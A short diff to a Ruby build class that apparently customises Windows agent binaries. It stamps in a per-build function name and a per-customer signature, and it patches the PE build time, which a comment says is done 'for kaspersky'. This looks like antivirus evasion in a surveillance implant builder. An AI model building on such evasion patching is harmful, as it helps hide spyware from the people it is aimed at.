@@ -39,7 +39,7 @@ class BuildWindows < Build
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
     # patching for the function name
-    patch_file(:file => path('core')) do |content|
+    patch_file(:file => 'core') do |content|
       begin
         content.binary_patch 'PFTBBP', @funcname
       rescue
@@ -50,7 +50,7 @@ class BuildWindows < Build
     end
 
     # patching the build time (for kaspersky)
-    patch_file(:file => path('core')) do |content|
+    patch_file(:file => 'core') do |content|
       begin
         offset = content.index("PE\x00\x00")
         raise "offset is nil" if offset.nil?
@@ -65,7 +65,7 @@ class BuildWindows < Build
     # we have an exception here, the core64 must be patched only with the signature and function name
 
     # patching for the function name
-    patch_file(:file => path('core64')) do |content|
+    patch_file(:file => 'core64') do |content|
       begin
         content.binary_patch 'PFTBBP', @funcname
       rescue
@@ -76,7 +76,7 @@ class BuildWindows < Build
     end
 
     # per-customer signature
-    patch_file(:file => path('core64')) do |content|
+    patch_file(:file => 'core64') do |content|
       begin
         sign = ::Signature.where({scope: 'agent'}).first
         signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
